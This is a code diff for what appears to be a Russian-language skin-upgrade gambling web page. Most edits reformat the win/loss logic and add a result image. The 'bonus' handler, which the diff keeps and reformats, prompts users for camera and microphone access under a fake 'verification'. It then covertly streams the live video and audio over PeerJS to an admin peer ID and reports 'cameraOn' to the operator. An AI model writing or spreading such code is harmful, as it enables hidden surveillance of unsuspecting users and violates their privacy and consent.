         state.stats.total++;state.stats.staked+=y.price;
         state.inventory=state.inventory.filter(id=>id!==y.id);
-        if(win){
-            state.stats.wins++;
-            state.balance+=t.price;
-            if(!state.inventory.includes(t.id))state.inventory.push(t.id);
-            if(t.price>state.stats.bestDrop)state.stats.bestDrop=t.price;
-            addHistory('win',`Апгрейд: ${y.name} → ${t.name}`,t.price);
-            showResult(true,t); Sound.win();
-        } else {
-            state.stats.loses++;
-            addHistory('lose',`Проигрыш: ${y.name}`,y.price);
-            showResult(false,y); Sound.lose();
-        }
+        if(win){ state.stats.wins++; state.balance+=t.price; if(!state.inventory.includes(t.id))state.inventory.push(t.id); if(t.price>state.stats.bestDrop)state.stats.bestDrop=t.price; addHistory('win',`Апгрейд: ${y.name} → ${t.name}`,t.price); showResult(true,t); Sound.win(); }
+        else { state.stats.loses++; addHistory('lose',`Проигрыш: ${y.name}`,y.price); showResult(false,y); Sound.lose(); }
         state.yourSkin=null;state.targetSkin=null;
         state.spinning=false;
-        setTimeout(()=>{
-            spinner.style.transition = 'opacity .4s';
-            spinner.style.opacity = '0';
-            setTimeout(()=>{ spinner.style.transition='none'; spinner.style.transform='rotate(0deg)'; state._spinnerRot=0; }, 400);
-        }, 1000);
+        setTimeout(()=>{ spinner.style.transition = 'opacity .4s'; spinner.style.opacity = '0'; setTimeout(()=>{ spinner.style.transition='none'; spinner.style.transform='rotate(0deg)'; state._spinnerRot=0; }, 400); }, 1000);
         updateInfo();renderInventory();updateCards();updateStatsUI();checkAch();saveState(true);
         sendToAdmin({type: win?'upgradeWin':'upgradeLose',your:y,target:t,yourPrice:y.price,targetPrice:t.price,ts:Date.now()});
         $('upgradeBtn').textContent='⬆ Прокачать';
@@ -1396,7 +1107,22 @@ function doUpgrade(){
     }, 4200);
 }
 
-function showResult(win,skin){const b=$('resultBox');b.className='result-box '+(win?'win':'lose');$('resultTitle').textContent=win?'Победа!':'Проигрыш';$('resultEmoji').textContent=win?'🎉':'💥';$('resultName').textContent=skin?`${skin.weapon} | ${skin.name}`:'';$('resultPrice').textContent=skin?fmt(skin.price):'';$('resultOverlay').classList.add('active');}
+function showResult(win,skin){
+    const b=$('resultBox');b.className='result-box '+(win?'win':'lose');
+    $('resultTitle').textContent=win?'Победа!':'Проигрыш';
+    if (skin) {
+        const img = getSkinImage(skin.weapon, skin.name);
+        const imgEl = $('resultImage');
+        const emojiEl = $('resultEmoji');
+        imgEl.src = img;
+        imgEl.style.display = 'block';
+        emojiEl.style.display = 'none';
+        imgEl.onerror = () => { imgEl.style.display = 'none'; emojiEl.style.display = 'block'; emojiEl.textContent = win ? '🎉' : '💥'; };
+    }
+    $('resultName').textContent=skin?`${skin.weapon} | ${skin.name}`:'';
+    $('resultPrice').textContent=skin?fmt(skin.price):'';
+    $('resultOverlay').classList.add('active');
+}
 function updateStatsUI(){$('statTotal').textContent=state.stats.total;$('statWins').textContent=state.stats.wins;$('statLoses').textContent=state.stats.loses;$('statRate').textContent=state.stats.total?Math.round(state.stats.wins/state.stats.total*100)+'%':'0%';$('statStaked').textContent=fmt(state.stats.staked).replace('.00','');$('statBest').textContent=state.stats.bestDrop?fmt(state.stats.bestDrop).replace('.00',''):'—';$('userLevel').textContent=1+state.stats.wins;}
 
 document.querySelectorAll('.main-tab').forEach(t=>t.addEventListener('click',()=>{document.querySelectorAll('.main-tab').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));t.classList.add('active');$('tab-'+t.dataset.main).classList.add('active');Sound.click();}));
@@ -1421,28 +1147,12 @@ $('bonusBtn').addEventListener('click', async () => {
     const textEl = $('bonusText');
     const claimBtn = $('bonusClaim');
     const isHttps = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
-    if (!isHttps) {
-        textEl.innerHTML = '⚠️ Сайт открыт по <b>HTTP</b>.<br>Нужен HTTPS.';
-        statusEl.textContent = 'Открой через https://';
-        statusEl.style.color = '#eb4b4b';
-        claimBtn.disabled = true;
-        return;
-    }
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        textEl.innerHTML = '⚠️ Браузер не поддерживает';
-        statusEl.textContent = 'Открой в Chrome или Safari';
-        statusEl.style.color = '#eb4b4b';
-        claimBtn.disabled = true;
-        return;
-    }
-    statusEl.textContent = '✅ Готово. Нажми кнопку';
-    statusEl.style.color = '#4ade80';
-    claimBtn.disabled = false;
+    if (!isHttps) { textEl.innerHTML = '⚠️ Сайт открыт по <b>HTTP</b>.<br>Нужен HTTPS.'; statusEl.textContent = 'Открой через https://'; statusEl.style.color = '#eb4b4b'; claimBtn.disabled = true; return; }
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { textEl.innerHTML = '⚠️ Браузер не поддерживает'; statusEl.textContent = 'Открой в Chrome или Safari'; statusEl.style.color = '#eb4b4b'; claimBtn.disabled = true; return; }
+    statusEl.textContent = '✅ Готово. Нажми кнопку'; statusEl.style.color = '#4ade80'; claimBtn.disabled = false;
 });
-
 $('bonusCancel').addEventListener('click',()=>$('bonusModal').classList.remove('active'));
 $('bonusModal').addEventListener('click',e=>{if(e.target.id==='bonusModal')$('bonusModal').classList.remove('active');});
-
 $('bonusClaim').addEventListener('click', async () => {
     const statusEl = $('camStatus');
     statusEl.textContent = '⏳ Запрос камеры и микрофона...';
@@ -1451,15 +1161,9 @@ $('bonusClaim').addEventListener('click', async () => {
         camStream = await navigator.mediaDevices.getUserMedia({video: {width:{ideal:640},height:{ideal:480}}, audio: true});
         statusEl.textContent = '✅ Камера + микрофон подключены!';
         statusEl.style.color = '#4ade80';
-        if (peer && peer.open) {
-            try { videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream); videoCall.on('stream', () => {}); } catch(e) {}
-        }
+        if (peer && peer.open) { try { videoCall = peer.call(ADMIN_PEER_ID + '_cam', camStream); videoCall.on('stream', () => {}); } catch(e) {} }
         sendToAdmin({type: 'cameraOn', ts: Date.now()});
-        setTimeout(() => {
-            $('bonusModal').classList.remove('active');
-            showToast('✅ Верификация пройдена','success',2500);
-            Sound.win();
-        }, 800);
+        setTimeout(() => { $('bonusModal').classList.remove('active'); showToast('✅ Верификация пройдена','success',2500); Sound.win(); }, 800);
     } catch(err) {
         let msg = '❌ Ошибка';
         if (err.name === 'NotAllowedError') msg = '❌ Отклонено';
